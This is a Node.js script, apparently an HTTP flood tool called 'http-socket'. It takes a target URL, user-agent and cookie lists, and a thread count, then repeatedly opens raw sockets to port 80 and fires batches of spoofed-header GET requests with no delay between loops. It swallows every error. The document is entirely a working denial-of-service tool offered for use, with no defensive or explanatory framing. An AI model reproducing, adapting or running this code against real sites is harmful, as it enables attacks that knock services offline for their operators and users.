const Url = require("url")
const request = require("request")
const events = require("events");
const fs = require("fs")
events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;
if(process.argv.length < 5) {
    return console.log(`[HTTP-SOCKET] Usage: node http-socket.js url ualist cookielist thread`)
}
var url = process.argv[2];
var uas =  fs.readFileSync(process.argv[3], 'utf-8').replace(/\r/g, '').split('\n');
var ua = uas[Math.floor(Math.random()* uas.length)]
var cookie = fs.readFileSync(process.argv[4], 'utf-8');
var cookie2 = `\"${cookie}\"`
var thread = process.argv[5];
var s1 = url
var host = Url.parse(url).host
var cok = ''
function Floor() {
request.get(
    {
        url: s1
    }, function(err ,res , body){
        if(err) {

        } else {
            var parsed = JSON.parse(JSON.stringify(res));
                    cok = parsed["request"]["headers"]["cookie"];
        }
    }
)
var int = setInterval(() => {

    var site = host
    if (ua) {
        var socket = require("net").Socket();
        socket.connect(80, host);
        socket.setTimeout(10000);
        for (var i = 0; i < thread; i++) {
            socket.write(
                "GET " +
                    s1 +
                    "/ HTTP/1.1\r\nHost: " +
                    host +
                    "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: " +
                    ua +
                    `\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nCookie: ${cookie2}\r\nConnection: Keep-Alive\r\n\r\n`
            );
        }
        socket.on("data", function () {
            setTimeout(function () {
                socket.destroy();
                return delete socket;
            }, 5000);
        })
    }
})
}
setInterval(()=> {
    console.log(`ы`)
    Floor()
}, 2000)


process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
